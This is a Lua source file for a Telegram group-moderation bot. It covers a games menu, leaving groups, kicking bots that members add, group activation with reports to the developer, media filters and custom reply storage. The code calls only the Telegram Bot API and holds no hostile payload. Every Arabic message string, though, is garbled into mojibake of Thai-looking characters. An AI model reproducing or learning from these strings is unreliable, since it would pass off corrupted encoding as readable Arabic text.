keyboard.inline_keyboard = {{{text="โข โ ุงูุดุทุฑูุฌ โ โข",url='https://t.me/T4TTTTBOT?game=chess'}},{{text="โข ูุนุจุฉ ููุงุจู ุจูุฑุฏ ๐ฅ โข",url='https://t.me/awesomebot?game=FlappyBird'},{text="โข ุชุญุฏู ุงูุฑูุงุถูุงุช โข",url='https://t.me/gamebot?game=MathBattle'}},{{text="โข ุงูุณ ุงู โข",url='t.me/xobot?start'},{text="โข ุณุจุงู ุงูุฏุฑุงุฌุงุช ๐ โข",url='https://t.me/gamee?game=MotoFX'}},{{text="โข ุณุจุงู ุณูุงุฑุงุช ๐ โข",url='https://t.me/gamee?game=F1Racer'},{text="โข ูุชุดุงุจู ๐พ โข",url='https://t.me/gamee?game=DiamondRows'}},{{text="โข ูุฑุฉ ูุฏู โฝ โข",url='https://t.me/gamee?game=FootballStar'}},{{text="โข ูุฑู๐คนโโ โข",url='https://t.me/gamee?game=Hexonix'},{text="โข Hexonixโ โข",url='https://t.me/gamee?game=Hexonix'}},{{text="โข MotoFx๐๏ธ โข",url='https://t.me/gamee?game=MotoFx'}},{{text="โข ูุนุจุฉ 2048 ๐ฐ โข",url='https://t.me/awesomebot?game=g2048'},{text="โข Squares๐ โข",url='https://t.me/gamee?game=Squares'}},{{text="โข Atomic 1โถ๏ธ โข",url='https://t.me/gamee?game=AtomicDrop1'},{text="โข Corsairs โข",url='https://t.me/gamebot?game=Corsairs'}},{{text="โข LumberJack โข",url='https://t.me/gamebot?game=LumberJack'}},{{text="โข LittlePlane โข",url='https://t.me/gamee?game=LittlePlane'},{text="โข RollerDisco โข",url='https://t.me/gamee?game=RollerDisco'}},{{text="โข ๐ฆ ูุนุจุฉ ุงูุชููู ๐ฆ โข",url='https://t.me/T4TTTTBOT?game=dragon'},{text="โข ๐ ูุนุจุฉ ุงูุงูุนู ๐ โข",url='https://t.me/T4TTTTBOT?game=snake'}},{{text="โข ๐ต ูุนุจุฉ ุงูุงููุงู ๐ด โข",url='https://t.me/T4TTTTBOT?game=color'}},{{text="โข ๐ ูุนุจุฉ ุงูุตุงุฑูุฎ ๐ โข",url='https://t.me/T4TTTTBOT?game=rocket'},{text="โข ๐น ูุนุจุฉ ุงูุณูุงู ๐น โข",url='https://t.me/T4TTTTBOT?game=arrow'}},{{text="โข ูุนุจุฉ ุงููููุฌุง โข",url='https://t.me/gamee?game=GravityNinja21'},{text="โข ูุนุจุฉ ุงููุฑุชู โข",url='https://t.me/gamee?game=KarateKid2'}},{{text = 'โข TeAm Rinda โข', url="t.me/Source_Rinda"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุบุงุฏุฑ (-%d+)$")  then
local Text = { string.match(text, "^(ุบุงุฏุฑ) (-%d+)$")}
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงููุฌููุนู โข ["..dp.title_.."]\nโ๏ธฐุชูุช ุงููุบุงุฏุฑู ูููุง ุถูุนู", 1, "md")
Dev_Rio(Text[2], 0, 1, "โ๏ธฐุจุงูุฑ ุงููุทูุฑ ุชู ูุบุงุฏุฑุฉ ูุฐู ุงููุฌููุนู ", 1, "md")  
ChatLeave(dp.id_, Rinda)
DevRio:srem(Rinda.."Rio:Groups", dp.id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูู ุชุชู ุงุถุงูุชู ุจูุง ูุงููู ุจูุบุงุฏุฑุชูุง", 1, "md")
end 
end,nil)
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevRio:incr(Rinda..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(Rinda.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevRio:get(Rinda.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Rinda) then 
DevRio:srem(Rinda.."Rio:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) and not Bot(msg) then
SendText(DevId,"โ๏ธฐุชู ุทุฑุฏ ุงูุจูุช ูู ุงููุฌููุนู โขโฏ\n-----------------------------------------\nโ๏ธฐุงูุถููุ โข "..Name.."\nโ๏ธฐุงุณู ุงููุฌููุนู โข ["..NameChat.."]\nโ๏ธฐุงูุฏู ุงููุฌููุนู โขโฏ\nโจ `"..msg.chat_id_.."` โฉ\n-----------------------------------------\nโ๏ธฐุงูููุช โข "..os.date("%I:%M%p").."\nโ๏ธฐุงูุชุงุฑูุฎ โข "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevRio:get(Rinda..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevRio:incr(Rinda..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevRio:incr(Rinda..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text ==('ุชูุนูู') and not SudoBot(msg) and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:FreeBot'..Rinda) then
if ChatType == 'pv' then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุงุชุณุชุทูุน ุชูุนููู ููุง ูุฑุฌู ุงุถุงูุชู ูู ูุฌููุนู ุงููุง', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุฌููุนู ุนุงุฏูู ูููุณุช ุฎุงุฑูู ูุง ุชุณุชุทูุน ุชูุนููู ูุฑุฌู ุงู ุชุถุน ุณุฌู ุฑุณุงุฆู ุงููุฌููุนู ุถุงูุฑ ูููุณ ูุฎูู ููู ุจุนุฏูุง ููููู ุฑูุนู ุงุฏูู ุซู ุชูุนููู', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'ููุดุฆ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ุงุฏูู'
else 
status = 'ุนุถู'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,rio) 
local admins = rio.members_
for i=0 , #admins do
if rio.members_[i].bot_info_ == false and rio.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if rio.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevRio:sadd(Rinda.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:sadd(Rinda.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Rinda.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:srem(Rinda.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(Rinda..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุฌููุนู ุจุงูุชุงููุฏ ููุนูู', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevRio:get(Rinda..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู ุงูู ูู โข *'..(DevRio:get(Rinda..'Rio:Num:Add:Bot') or 0)..'* ุนุถู', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","โ๏ธฐุชูุนู ุงููุฌููุนู "..dp.title_)  
DevRio:sadd(Rinda.."Rio:Groups",msg.chat_id_)
DevRio:sadd(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ูุง ููุฌุฏ'
end
DevRio:set(Rinda.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"โ๏ธฐุชูุนู ูุฌููุนู ุฌุฏูุฏู โขโฏ\n-----------------------------------------\nโ๏ธฐุงูุถููุ โข "..Name.."\nโ๏ธฐูููุนู ูู ุงููุฌููุนู โข "..status.."\nโ๏ธฐุงุณู ุงููุฌููุนู โข ["..NameChat.."]\nโ๏ธฐุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู โข โจ *"..NumMem.."* โฉ\nโ๏ธฐุงูุฏู ุงููุฌููุนู โขโฏ\nโจ `"..msg.chat_id_.."` โฉ\nโ๏ธฐุฑุงุจุท ุงููุฌููุนู โข โค\nโจ ["..LinkGroup.."] โฉ\n-----------------------------------------\nโ๏ธฐุงูููุช โข "..os.date("%I:%M%p").."\nโ๏ธฐุงูุชุงุฑูุฎ โข "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุชูุนูู ูุฐู ุงููุฌููุนู ุจุณุจุจ ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู', 1, 'md') 
end 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevRio:set(Rinda..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
local ReFalse = tostring(msg.chat_id_)
if not DevRio:sismember(Rinda.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevRio:get(Rinda..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
local Text = 'โ๏ธฐูููู ุจเขชู โข ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\nโ๏ธฐูุฌุจ ุนูููุง ุงูุชุฃูุฏ ุฃูู ูุณุช ุฑูุจูุช\nโ๏ธฐุชู ุชููุฏู ุงุถุบุท ุงูุฒุฑ ุจุงูุงุณูู ูููู'
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุถุบุท ููุง ููู ุชููุฏู โข",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevRio:get(Rinda.."Rio:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Bot(msg) then 
local filter = DevRio:smembers(Rinda.."Rio:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธฐุงูุตูุฑู ุงูุชู ุงุฑุณูุชูุง ุชู ููุนูุง ูู ุงููุฌููุนู")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Bot(msg) then 
local filter = DevRio:smembers(Rinda.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธฐุงููุชุญุฑูู ุงูุชู ุงุฑุณูุชูุง ุชู ููุนูุง ูู ุงููุฌููุนู")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Bot(msg) then 
local filter = DevRio:smembers(Rinda.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธฐุงูููุตู ุงูุฐู ุงุฑุณูุชู ุชู ููุนู ูู ุงููุฌููุนู")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevRio:get(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevRio:get(Rinda..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงูุฑุฏ โข '..msg.content_.text_..' ูููููู โข '..GetGpTexts..' ุชู ุญุฐููุง',  1, "html")
DevRio:del(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Rinda..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงููููู ( '..msg.content_.text_..' ) ุชู ุญุฐููุง',  1, "html")
DevRio:del(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงููููู ( '..msg.content_.text_..' ) ุชู ุญุฐููุง',  1, "html")
DevRio:del(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Rinda..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Rinda..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevRio:get(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงููููู ( '..msg.content_.text_..' ) ุชู ุญุฐููุง',  1, "html")
DevRio:del(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Rinda.."Rio:Gif:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:Voice:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:Audio:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:Photo:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:Stecker:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:Video:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:File:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:Text:AllRed"..msg.content_.text_)
DevRio:del(Rinda.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevRio:get(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevRio:get(Rinda..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(Rinda..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "ุงูุบุงุก" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐโ๏ธฐุชู ุงูุบุงุก ุนูููุฉ ุญูุธ ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู ููุงูุฑ โข "..GetGpTexts ,  1, "md")
DevRio:del(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevRio:del(Rinda..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(Rinda..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ โข 5 ูู ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู ููุงูุฑ โข "..GetGpTexts ,  1, "md")
DevRio:del(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
local Rio = "โ๏ธฐุชู ุญูุธ ุงูุฑุฏ ุฑูู โข "..(#List+1).."\nโ๏ธฐูู ุจุงุฑุณุงู ุงูุฑุฏ ุฑูู โข "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงููุงุก ูุญูุธ "..(#List+1).." ูู ุงูุฑุฏูุฏ โข",callback_data="/EndRedod:"..msg.sender_user_id_..GetGpTexts}},{{text="โข ุงูุบุงุก ูุญุฐู ุงูุชุฎุฒูู โข",callback_data="/DelRedod:"..msg.sender_user_id_..GetGpTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Rio).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
if text and not DevRio:get(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local RindaTeam =  DevRio:smembers(Rinda..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..RindaTeam[math.random(#RindaTeam)]..']' , 1, 'md')  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^(.*)$") then
local SaveKt = DevRio:get(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SaveKt == 'SaveKt' then
local GetKtTexts = DevRio:get(Rinda..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(Rinda..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_)
if text == "ุงูุบุงุก" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐโ๏ธฐุชู ุงูุบุงุก ุนูููุฉ ุญูุธ ุงุณุฆูุฉ ุงููุช  โข "..GetKtTexts ,  1, "md")
